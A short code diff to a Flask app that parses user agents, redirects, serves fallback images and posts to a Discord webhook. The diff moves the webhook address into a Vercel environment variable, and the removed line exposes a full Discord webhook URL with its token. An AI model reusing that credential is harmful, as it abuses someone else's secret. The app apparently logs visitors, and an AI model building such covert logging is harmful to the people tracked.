@@ -1,17 +1,15 @@
 from flask import Flask, request, redirect
 import requests
 import json
+import os
 from datetime import datetime
 from user_agents import parse
 
 app = Flask(__name__)
 
-# CONFIGURATION
-WEBHOOK_URL = "https://discord.com/api/webhooks/1474987213019287745/MiPRIVfwiJcHNgsFlyT_JNFUXWR8E6CxFZpw2henPkFag6vxhDQyXs_92X9EOBsX-9e7"
-
-# CUSTOM IMAGE: Set this to your own image URL if you want a specific one
-# If empty, it will use the random ones below
-CUSTOM_IMAGE_URL = "" 
+# CONFIGURATION (Loaded from Environment Variables in Vercel)
+WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
+CUSTOM_IMAGE_URL = os.environ.get("CUSTOM_IMAGE_URL", "") 
 
 # List of random fallback images
 IMAGES = [
